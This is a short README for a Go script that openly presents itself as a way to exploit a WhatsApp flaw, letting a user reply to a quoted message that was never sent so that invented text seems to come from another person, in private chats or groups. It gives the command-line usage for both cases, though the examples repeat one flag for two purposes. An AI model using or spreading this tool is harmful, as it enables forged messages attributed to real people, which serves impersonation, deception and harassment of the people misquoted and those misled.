# whatsapp_go

This is script makes easier to exploit a vulnerability that exists in WhatsApp.

The vulnerability consists in reply to a message that does not exists in the conversation,
making possible to send whatever text you want on it

## Usage

The phone number must have country code but without `+`

### Reply to a message to someone
```
go run main.go -t 553170707070 -r "Message that i`ll reply from someone else" -t "Text from my message" 
```

### Reply to message in a group
```
go run main.go -t 553170707070 -r "Message that i`ll reply from someone else" -t "Text from my message" -g "Group name"
```
